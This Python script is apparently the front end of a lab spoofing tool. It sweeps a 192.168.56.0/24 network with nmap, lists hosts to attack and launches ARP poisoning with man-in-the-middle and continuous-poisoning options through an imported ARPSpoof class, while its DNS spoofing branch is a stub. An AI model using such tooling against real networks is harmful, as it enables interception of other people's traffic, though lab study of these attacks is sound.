from scapy.all import *
from scapy.layers import *
from scapy.layers.inet import IP
from dns_spoofing import *
import threading
import time
import socket
from socket import socket
import nmap
import os
import sys
from getmac import get_mac_address
#import arp_poisoning
import dns_spoofing
from arp_spoofing import ARPSpoof
import arp_spoofing
from utils.interface import InterfaceConfig

			
def begin():
	settings={}
	print("\nWelcome to the most fabulous spoofing tool!")

	print("\nSelect kind of attack to perform on Victim who hates ducks: \n")
	print("1:	ARP Poisoning")
	print("2:	DNS Spoofing\n")

	attack_to_perform = input()
	if attack_to_perform == "1":
	
	#search for available hosts
		hosts=[]
		target = '192.168.56.0/24'
 
		scanner = nmap.PortScanner()
		scanner.scan(target, arguments='-sn', sudo=True)
 
		hosts = []
 
		for host in scanner.all_hosts():
			addresses = scanner[host]['addresses']
 
			hosts.append(addresses)
		print('\n*** Hosts available to attack ***\n') 
		print(hosts)
	
		print("\n \nSet your Victim's IP Address")
		Victim1_ip= input()
		
		print("\n \nVictim selected with MAC Address: " + getmacbyip(Victim1_ip))
	
		print("\n \nWould you like to become Man-In-The_Middle?")
		choice=input()
		if choice == "y" or choice == "Y" or choice == "yes" or choice =="YES":
			MitM = True
		else: MitM = False
		
		
		print("\n \nWould you like to restore the ARP cache after the attack?")
		choice=input()
		if choice == "y" or choice == "Y" or choice == "yes" or choice =="YES":
			Restore_Cache = True
		else: Restore_Cache = False
		
		print("\n \nWould you like to constantly poison the Victim's ARP Cache?")
		choice=input()
		if choice == "y" or choice == "Y" or choice == "yes" or choice =="YES":
			DuckForce = True
		else: DuckForce = False
		
		arp_attack = ARPSpoof(victim1_ip = Victim1_ip, victim2_ip ="192.168.56.102", mitm =MitM,restore= Restore_Cache,duckforce= DuckForce)
		
		try: 
			while True:
				arp_attack.start_attack()
				if arp_attack.duckforce == False:
					break
		except KeyboardInterrupt:
				pass
		if arp_attack.restore:
			print("Restoring ARP Cache...")
			arp_attack.restore_arp()
		
	elif attack_to_perform == "2":
		print("\n \nSet your Victim's IP Address")
		Victim1_ip= input()
		arp_attack_4dns = ARPSpoof(victim1_ip = Victim1_ip, victim2_ip ="192.168.56.103", mitm =False,restore= True,duckforce= True)
		#arp_attack_4dns.start_attack()
		#try: 
		#	while True:
		#		arp_attack._4dnsstart_attack()
				
		#except KeyboardInterrupt:
		#		pass
		#print("Restoring ARP Cache...")
		#arp_attack_4dns.restore_arp()
		print("dns")
		
	return 

if __name__ == '__main__':
	try:	
		begin()
		#if settings["restore_arp_choice"]:
		#			print("\n *** Restoring ARP caches of the infected Victims... ***")
		#			restore_arp(settings["VICTIM_MAC"], settings['VICTIM_IP'])
			
	except KeyboardInterrupt:
			print('Exiting program ...')
			#if restore:
			#		print("Restoring ARP caches of the infected Victims...")
			#arp_attack = ARPSpoof(victim1_ip = '0.0.0.0', victim2_ip ="192.168.56.102", mitm =False,restore= True,duckforce= True)
			#arp_attack.restore_arp()
